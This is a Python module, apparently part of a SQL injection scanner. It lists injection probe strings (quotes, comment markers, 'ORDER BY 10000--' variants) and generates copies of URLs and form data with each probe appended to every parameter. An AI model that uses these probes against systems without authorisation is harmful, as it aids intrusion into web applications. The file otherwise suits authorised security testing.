# MIT License
# 
# Copyright (c) 2024 Connor-Jay Dunn
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import urllib

payload_chars = [
    "'",
    '"',
    " ORDER BY 10000",
    " ORDER BY 10000--",
    " ORDER BY 10000#",
    "#",
    "--",
    "-- -",
    "/*",
    "`",
    ]

def create_injected_urls(url, payload_char):
    """
    Generates a list of URLs with injected payload characters

    Parameters:
        url (str): The original URL.
        payload_char (str): The character to inject into each query parameter's value.

    Returns:
        list: A list of URLs with the payload character injected into the query parameters.
    """
    payloads = []
    
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)

    for key in query_params:
        # .copy() may not be required here if we just reset back to old value before iterating
        query_params_copy = query_params.copy()
        query_params_copy[key] = [value + payload_char for value in query_params_copy[key]]

        injected_query = '&'.join(f"{key}={'&'.join(values)}" for key, values in query_params_copy.items())

        payloads.append(urllib.parse.urlunparse(parsed_url._replace(query=injected_query)))

    return payloads

def create_injected_data(data, payload_char):
    """
    Creates a list of dictionaries with payload characters injected into each value.

    Parameters:
        data (dict): The original data dictionary to be injected.
        payload_char (str): The character to inject into each value in the data dictionary.

    Returns:
        list: A list of dictionaries with the payload character injected into the values.
    """
    payloads = []

    for key in data:
        # .copy() may not be required here if we just reset back to old value before iterating
        data_copy = data.copy()

        data_copy[key] = data[key] + payload_char

        payloads.append(data_copy)

    return payloads

def get_full_url(url, data):
    """
    Constructs a full URL with the given data dictionary appended as query parameters.

    Parameters:
        url (str): The base URL.
        data (dict): The dictionary of data to be included as query parameters.

    Returns:
        str: The full URL with the appended query parameters.
    """
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)

    query_params.update(data)

    encoded_params = urllib.parse.urlencode(query_params, doseq=True)

    return urllib.parse.urlunparse(parsed_url._replace(query=encoded_params))
